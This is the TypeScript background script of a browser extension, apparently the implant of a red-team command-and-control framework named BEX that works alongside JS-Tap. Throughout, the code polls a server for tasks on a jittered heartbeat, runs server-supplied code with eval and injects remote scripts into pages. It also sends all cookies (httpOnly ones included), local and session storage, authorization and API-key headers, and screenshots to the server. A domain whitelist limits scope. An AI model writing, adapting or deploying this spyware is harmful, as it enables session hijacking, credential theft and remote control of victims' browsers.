
import { CONFIG, isUrlWhitelisted, isDomainWhitelisted } from '@/utils/config';
import { arrayBufferToBase64, base64ToArrayBuffer, importKey, encrypt, decrypt } from '@/utils/crypto';
import { connectSidecar, initSidecarTaskListener, reportSidecarStatus } from '@/utils/sidecar';
import { startProxy, stopProxy, updateSpoofConfig, isProxyActive } from '@/utils/proxy';

export default defineBackground(() => {
  let sessionUUID: string | null = null;
  let sendKey: CryptoKey | null = null;
  let receiveKey: CryptoKey | null = null;
  let isInitializing = false;
  const messageQueue: Array<{path: string, message: any}> = [];

  async function register() {
    if (isInitializing) return;
    isInitializing = true;
    console.log("BEX: Registering...");
    const url = `${CONFIG.serverUrl}/client/getToken/${CONFIG.tag}/${CONFIG.clientType}`;

    try {
      const resp = await fetch(url);
      if (resp.ok) {
        const data = await resp.json();
        sessionUUID = data.clientToken;
        await browser.storage.local.set({ sessionUUID });
        console.log("BEX: Registered with UUID:", sessionUUID);
        await initKeys();
      }
    } catch (e) {
      console.error("BEX: Registration error:", e);
    } finally {
      isInitializing = false;
    }
  }

  async function initKeys() {
    if (!sessionUUID) return;
    console.log("BEX: Initializing keys...");
    try {
      // Generate an ephemeral RSA-OAEP keypair
      const rsaKeyPair = await crypto.subtle.generateKey(
        {
          name: "RSA-OAEP",
          modulusLength: 2048,
          publicExponent: new Uint8Array([1, 0, 1]),
          hash: "SHA-256"
        },
        false,
        ["decrypt"]
      );

      // Export the public key as SPKI/DER and base64-encode it
      const publicKeyDer = await crypto.subtle.exportKey("spki", rsaKeyPair.publicKey);
      const publicKeyBase64 = await arrayBufferToBase64(publicKeyDer);

      const url = `${CONFIG.serverUrl}/client/keyExchange/${sessionUUID}`;
      const resp = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ publicKey: publicKeyBase64 })
      });

      if (resp.ok) {
        const data = await resp.json();
        if (data.enable === "true") {
          // Decrypt the RSA-OAEP encrypted AES keys
          const encryptedBytes = base64ToArrayBuffer(data.encryptedKeys);
          const decryptedBuffer = await crypto.subtle.decrypt(
            { name: "RSA-OAEP" },
            rsaKeyPair.privateKey,
            encryptedBytes
          );
          const decryptedKeys = new Uint8Array(decryptedBuffer);

          // First 32 bytes = sendKey, next 32 bytes = receiveKey
          const sendKeyData    = decryptedKeys.slice(0, 32);
          const receiveKeyData = decryptedKeys.slice(32, 64);

          sendKey = await importKey(sendKeyData, ["encrypt"]);
          receiveKey = await importKey(receiveKeyData, ["decrypt"]);
          console.log("BEX: Keys initialized. Processing queue of", messageQueue.length, "messages.");

          // Process queued messages
          const queueToProcess = [...messageQueue];
          messageQueue.length = 0;
          for (const queued of queueToProcess) {
            try {
              await sendEncrypted(queued.path, queued.message);
            } catch (e) {
              console.error("BEX: Failed to send queued message", e);
            }
          }

          // Immediate task check on startup/re-init
          checkTasks();

          // Connect sidecar native messaging host (if enabled in config)
          connectSidecar();
        }
      } else {
        // Key exchange failed — server doesn't recognize this UUID (stale session).
        // Clear stored UUID and re-register to get a fresh session.
        console.warn("BEX: Key exchange failed (status " + resp.status + "), re-registering...");
        sessionUUID = null;
        sendKey = null;
        receiveKey = null;
        await browser.storage.local.remove("sessionUUID");
        await register();
      }
    } catch (e) {
      console.error("BEX: Key init error:", e);
      // Network error or other failure — clear state and re-register
      sessionUUID = null;
      sendKey = null;
      receiveKey = null;
      await browser.storage.local.remove("sessionUUID");
      await register();
    }
  }

  async function sendEncrypted(path: string, message: any) {
    if (!sessionUUID || !sendKey) {
      console.log("BEX: Keys not ready, queuing message for path:", path);
      messageQueue.push({ path, message });
      if (!isInitializing && !sessionUUID) register();
      return;
    }

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const pathData = new TextEncoder().encode(path);
    const messageData = new TextEncoder().encode(JSON.stringify(message));

    const encryptedPath = await encrypt(sendKey, iv, pathData);
    const encryptedMessage = await encrypt(sendKey, iv, messageData);

    const payload = {
      metricData: [
        await arrayBufferToBase64(iv),
        await arrayBufferToBase64(encryptedPath),
        await arrayBufferToBase64(encryptedMessage)
      ].join(',')
    };

    return await fetch(`${CONFIG.serverUrl}/client/metrics/${sessionUUID}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  async function checkTasks() {
    if (!sessionUUID || !sendKey || !receiveKey) return;

    try {
      const resp = await sendEncrypted("/client/taskCheck", {});
      if (resp && resp.ok) {
        const jsonResponse = await resp.json();

        let tasks = [];
        if (jsonResponse.metricData) {
            // Encrypted response
            const metricData = jsonResponse.metricData;
            const parts = metricData.split(",");

            const ivBuffer = base64ToArrayBuffer(parts[0]);
            const cipherBuffer = base64ToArrayBuffer(parts[1]);

            const clearMessageBuffer = await decrypt(receiveKey, new Uint8Array(ivBuffer), new Uint8Array(cipherBuffer));
            const clearMessageText = new TextDecoder().decode(clearMessageBuffer);
            tasks = JSON.parse(clearMessageText);
        } else {
            // Unencrypted response (crypto not yet active or disabled)
            tasks = jsonResponse;
        }

        console.log("BEX: Received tasks:", tasks.length);

        // Collect sidecar commands separately so they can be dispatched
        // as an ordered batch and executed sequentially by the sidecar module
        const sidecarBatch: any[] = [];

        for (const task of tasks) {
          console.log("BEX: Processing task ID:", task.id);
          try {
            const rawData = atob(task.data);
            console.log("BEX: Raw task data:", rawData);
            // Check if it's a JSON configuration object
            if (rawData.trim().startsWith('{')) {
                const config = JSON.parse(rawData);
                if (config.type === 'CONFIG_INJECTION') {
                    console.log("BEX: Updating injection rule for domain:", config.domain, "Active:", config.active, "URL:", config.url);

                    // Whitelist enforcement: reject injection tasks for non-whitelisted domains
                    if (config.active && !isDomainWhitelisted(config.domain)) {
                        console.log("BEX: Injection task for non-whitelisted domain rejected:", config.domain);
                        continue;
                    }

                    const rules = await browser.storage.local.get('injectionRules');
                    const currentRules = rules.injectionRules || {};

                    if (config.active) {
                        let finalUrl = config.url;
                        if (finalUrl.startsWith('/')) {
                            // Resolve relative URL against the beacon's known server URL
                            finalUrl = `${CONFIG.serverUrl}${finalUrl}`;
                        }
                        currentRules[config.domain] = finalUrl;
                    } else {
                        console.log("BEX: Removing injection rule for", config.domain);
                        delete currentRules[config.domain];
                    }

                    await browser.storage.local.set({ injectionRules: currentRules });
                    console.log("BEX: Current injection rules:", currentRules);

                    // Immediate Action: If we just got an active rule, try to inject into matching tabs immediately
                    if (config.active) {
                        const tabs = await browser.tabs.query({});
                        for (const tab of tabs) {
                            if (tab.id && tab.url) {
                                const tabUrl = new URL(tab.url);
                                if (tabUrl.hostname === config.domain) {
                                    console.log("BEX: Found existing tab for new rule, injecting immediately:", tab.id);
                                    // Use the resolved finalUrl from currentRules
                                    injectIntoTab(tab.id, currentRules[config.domain]);
                                }
                            }
                        }
                    }
                    continue; // Skip eval
                }

                if (config.type === 'SIDECAR_COMMAND') {
                    // Queue for sequential batch execution (preserves command order)
                    sidecarBatch.push(config);
                    continue;
                }

                if (config.type === 'PROXY_START') {
                    console.log("BEX: Starting proxy mode");
                    if (sessionUUID) {
                        startProxy(sessionUUID);
                    }
                    continue;
                }

                if (config.type === 'PROXY_STOP') {
                    console.log("BEX: Stopping proxy mode");
                    stopProxy();
                    continue;
                }

                if (config.type === 'PROXY_SPOOF_UPDATE') {
                    console.log("BEX: Updating proxy spoof config");
                    updateSpoofConfig(config.spoofConfig || {});
                    continue;
                }
            }

            // Fallback to standard eval for legacy tasks
            console.log("BEX: Executing legacy task via eval");
            eval(rawData);
          } catch (e) {
            console.error("BEX: Task execution failed", e);
          }
        }

        // Dispatch sidecar commands as an ordered batch so the sidecar
        // module can execute them sequentially (one at a time)
        if (sidecarBatch.length > 0) {
          console.log("BEX: Dispatching sidecar batch of", sidecarBatch.length, "commands");
          const event = new CustomEvent('sidecar-task-batch', { detail: sidecarBatch });
          self.dispatchEvent(event);
        }
      }
    } catch (e) {
      console.error("BEX: Heartbeat failed", e);
    }
  }

  async function injectIntoTab(tabId: number, scriptUrl: string) {
    // Helper to perform the actual script injection
    try {
        await browser.scripting.executeScript({
            target: { tabId: tabId },
            world: 'MAIN',
            func: (src) => {
                console.log("%c[BEX] MAIN world executing loader creation for: " + src, "color: #00ff00; font-weight: bold;");
                const script = document.createElement('script');
                script.src = src;
                script.async = true;
                script.onload = () => console.log("%c[BEX] JS-Tap script loaded successfully.", "color: #00ff00;");
                script.onerror = (e) => console.error("[BEX] JS-Tap script failed to load. Target URL likely blocked or 404.", e);
                (document.head || document.documentElement).appendChild(script);
            },
            args: [scriptUrl]
        });
        console.log("BEX: Injection successfully dispatched to tab", tabId);
    } catch (e) {
        console.error("BEX: [ERROR] Injection failed for tab", tabId, e);
    }
  }

  // Helper: capture all cookies (including httpOnly) for a URL via browser.cookies API
  async function captureCookiesForUrl(url: string, domain: string) {
    try {
      const cookies = await browser.cookies.getAll({ url });
      for (const cookie of cookies) {
        sendEncrypted("/bex/capture", {
          domain, url,
          type: 'cookie',
          name: cookie.name,
          value: cookie.value,
          metadata: JSON.stringify({
            httpOnly: cookie.httpOnly,
            secure: cookie.secure,
            sameSite: cookie.sameSite,
            path: cookie.path,
            domain: cookie.domain,
            expirationDate: cookie.expirationDate
          })
        });
      }
    } catch (e) {
      // cookies API may fail for some URLs (chrome://, about:, etc)
    }
  }

  // Injection Listener — with whitelist enforcement
  browser.webNavigation.onCompleted.addListener(async (details) => {
    if (details.frameId === 0) { // Top-level frame
        // Whitelist enforcement: skip injection for non-whitelisted domains
        if (!isUrlWhitelisted(details.url)) {
            return;
        }

        const rules = await browser.storage.local.get('injectionRules');
        const currentRules = rules.injectionRules || {};

        const url = new URL(details.url);
        console.log("BEX: Navigation completed for", url.hostname, "Checking rules...");

        // Capture all cookies (including httpOnly) for this URL
        captureCookiesForUrl(details.url, url.hostname);

        if (currentRules[url.hostname]) {
            const scriptUrl = currentRules[url.hostname];
            console.log("BEX: [MATCH] Target domain matched! Injecting loader:", scriptUrl, "into tab", details.tabId);
            injectIntoTab(details.tabId, scriptUrl);
        } else {
            console.log("BEX: No rule for", url.hostname, "Available rules:", Object.keys(currentRules));
        }
    }
  });

  // Jittered heartbeat scheduling
  function scheduleNextHeartbeat() {
    const baseMs = CONFIG.heartbeat.baseInterval * 1000;
    const jitterFraction = CONFIG.heartbeat.jitterPercent / 100;
    const minMs = baseMs * (1 - jitterFraction);
    const maxMs = baseMs * (1 + jitterFraction);
    const delayMs = minMs + Math.random() * (maxMs - minMs);
    const delayMinutes = delayMs / 60000;

    console.log(`BEX: Next heartbeat in ${(delayMs / 1000).toFixed(1)}s (base: ${CONFIG.heartbeat.baseInterval}s, jitter: ${CONFIG.heartbeat.jitterPercent}%)`);
    browser.alarms.create("heartbeat", { delayInMinutes: delayMinutes });
  }

  // Setup
  browser.storage.local.get("sessionUUID").then(async (res) => {
    sessionUUID = res.sessionUUID;
    if (!sessionUUID) {
      await register();
    } else {
      await initKeys();
    }

    // Start jittered heartbeat (one-shot alarms that reschedule)
    scheduleNextHeartbeat();
  });

  browser.alarms.onAlarm.addListener((alarm) => {
    if (alarm.name === "heartbeat") {
      checkTasks();
      connectSidecar(); // No-op if already connected or disabled; retries if not yet available
      reportSidecarStatus();
      scheduleNextHeartbeat(); // Re-arm with fresh jitter
    }
  });

  // Initialize sidecar task listener (no-op if sidecar disabled in config)
  initSidecarTaskListener();

  // Telemetry listener from content scripts — with whitelist enforcement
  browser.runtime.onMessage.addListener(async (message, sender) => {
    if (message.type === 'TELEMETRY') {
      const { domain, url, localStorage, sessionStorage, cookies } = message.data;

      // Whitelist enforcement: defense-in-depth check on telemetry from content scripts
      if (!isUrlWhitelisted(url)) {
        console.log("BEX: Telemetry from non-whitelisted domain ignored:", domain);
        return;
      }

      console.log("BEX: Received telemetry for", domain);

      // Report domain/url visited
      sendEncrypted("/bex/report", {
        visits: [{ domain, url }]
      });

      // Capture all cookies (including httpOnly) via browser.cookies API
      captureCookiesForUrl(url, domain);

      // Report localStorage
      for (const [name, value] of Object.entries(localStorage)) {
        sendEncrypted("/bex/capture", {
          domain,
          url,
          type: 'local_storage',
          name,
          value: value as string
        });
      }

      // Report sessionStorage
      for (const [name, value] of Object.entries(sessionStorage)) {
        sendEncrypted("/bex/capture", {
          domain,
          url,
          type: 'session_storage',
          name,
          value: value as string
        });
      }
    } else if (message.type === 'TAKE_SCREENSHOT') {
      const { sessionUUID: implantUUID, isEncrypted } = message.data;

      // Critical Check: We can only capture the visible tab.
      // If the requesting implant is in a background tab, capturing 'visible' will grab the WRONG site.
      if (!sender.tab?.active) {
        console.log("BEX: [SCREENSHOT] Skipped. Requesting tab is not active:", sender.tab?.id);
        return { success: false, reason: "background_tab" };
      }

      console.log("BEX: [SCREENSHOT] Capturing active tab for implant:", implantUUID);

      try {
        // Capture the visible area of the active tab
        const dataUrl = await browser.tabs.captureVisibleTab(undefined, { format: 'png' });

        // Convert dataURL to Blob/ArrayBuffer
        const resp = await fetch(dataUrl);
        const blob = await resp.blob();

        if (sendKey) {
          // Exfiltrate via our own encrypted metrics channel but tag it for the target implant
          const arrayBuffer = await blob.arrayBuffer();
          // We send to OUR metrics endpoint (sessionUUID is the beacon's here),
          // but use a path that specifies the target implant.
          await sendEncryptedData(sessionUUID!, `/bex/screenshot/${implantUUID}`, arrayBuffer);
        } else {
          // Unencrypted exfil (fallback)
          await fetch(`${CONFIG.serverUrl}/loot/screenshot/${implantUUID}`, {
            method: 'POST',
            body: blob
          });
        }
        console.log("BEX: [SCREENSHOT] Successfully exfiltrated high-quality capture.");
        return { success: true };
      } catch (e) {
        console.error("BEX: [SCREENSHOT] Failed to capture or exfiltrate.", e);
        return { success: false, error: String(e) };
      }
    }
  });

  async function sendEncryptedData(targetUUID: string, path: string, data: ArrayBuffer) {
    if (!sendKey) return;

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const pathData = new TextEncoder().encode(path);

    const encryptedPath = await encrypt(sendKey, iv, pathData);
    const encryptedMessage = await encrypt(sendKey, iv, new Uint8Array(data));

    const payload = {
      metricData: [
        await arrayBufferToBase64(iv),
        await arrayBufferToBase64(encryptedPath),
        await arrayBufferToBase64(encryptedMessage)
      ].join(',')
    };

    return await fetch(`${CONFIG.serverUrl}/client/metrics/${targetUUID}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  }

  // Expose sendEncrypted for sidecar module access
  (self as any).__bexSendEncrypted = sendEncrypted;
  (self as any).__bexGetSessionUUID = () => sessionUUID;

  // Header capture logic — with whitelist enforcement via shared helper
  const INTERESTING_HEADERS = ['authorization', 'x-api-key', 'cookie', 'set-cookie'];
  const captureCache = new Map<string, number>();

  const headerUrlFilter = CONFIG.domainScoping.whitelistEnabled
    ? { urls: CONFIG.domainScoping.whitelist }
    : { urls: ['<all_urls>'] as string[] };

  browser.webRequest.onSendHeaders.addListener(
    (details) => {
      if (!details.requestHeaders) return;
      const url = new URL(details.url);
      const domain = url.hostname;
      const currentUrl = details.url;

      // Defense-in-depth: also check via helper in case filter patterns don't perfectly match
      if (!isUrlWhitelisted(currentUrl)) return;

      details.requestHeaders.forEach(header => {
        const headerName = header.name.toLowerCase();
        if (INTERESTING_HEADERS.includes(headerName)) {
          const value = header.value || '';
          // Create a unique key for this capture
          const cacheKey = `${domain}:${headerName}:${value}`;
          const now = Date.now();

          // Only send if we haven't seen this exact capture in the last 60 seconds
          if (!captureCache.has(cacheKey) || (now - captureCache.get(cacheKey)! > 60000)) {
            captureCache.set(cacheKey, now);

            // Clean up cache if it gets too big
            if (captureCache.size > 1000) {
                const oldest = now - 60000;
                for (const [k, v] of captureCache.entries()) {
                    if (v < oldest) captureCache.delete(k);
                }
            }

            sendEncrypted("/bex/capture", {
              domain,
              url: currentUrl,
              type: 'header',
              name: header.name,
              value: value
            });
          }
        }
      });
    },
    headerUrlFilter,
    ['requestHeaders', 'extraHeaders']
  );

  console.log("BEX Background loaded.");
});
